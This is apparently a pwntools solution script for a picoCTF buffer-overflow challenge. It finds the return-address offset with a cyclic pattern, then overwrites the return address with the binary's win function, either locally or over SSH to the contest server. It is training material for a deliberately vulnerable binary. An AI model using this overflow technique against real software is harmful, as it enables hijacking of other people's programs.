from pwn import *
import json

LOCAL = True # If set to false then you will try to connect to the pico server
CYCLIC_FOUND = True # If set to false then you will run a cyclic search to find offset

local_bin = './vuln'
elf = ELF(local_bin)

'''
If you are running this on your local machine then all you need is to start
the process. However, if you are trying to solve on the server then you must
set up the ssh conection and begin the process by actually sending a line with
the execution statement in it
'''
if(LOCAL):
    p = process(local_bin)

else:
    hostname ="2018shell.picoctf.com"
    dir = '/problems/buffer-overflow-1_2_86cbe4de3cdc8986063c379e61f669ba'
    with open("../../creds.json") as f:
        creds = json.load(f)
        print(creds["user"],creds["pass"])
    s = ssh(host=hostname,user=creds["user"],password=creds["pass"])
    s.set_working_directory(dir)
    p = s.process('sh')
    p.sendline('./vuln')

'''
This problem prints out your return address, so once you run this function
you will be able to find what your offset needs to be by using
cyclic_find() with the return address that this function
creates
'''
if(not CYCLIC_FOUND):
    payload = cyclic(100)
    print(p.recvline().decode())
    p.sendline(payload)
    print(p.recvall().decode())

main = elf.symbols['main'] # This will give you the address of main function in memory
win = elf.symbols['win']   # This will give you the address of win function in memory

# Setting up the payload to be sent. Will end up looking like
# AAAAAA...A\xcb\x85\x04\x08
number_of_offset_bytes = cyclic_find(0x6161616c)
payload = number_of_offset_bytes * "A"
payload += p32(win)

# Prints to terminal to help you see what is going on
log.info("Main start: " + hex(main))
log.info("Win start: " + hex(win))
log.info("Offset size: %d" % number_of_offset_bytes)

# Sends payload and prints the returned text
print()
print(p.recvline().decode())
p.sendline(payload)
print(p.recv().decode())
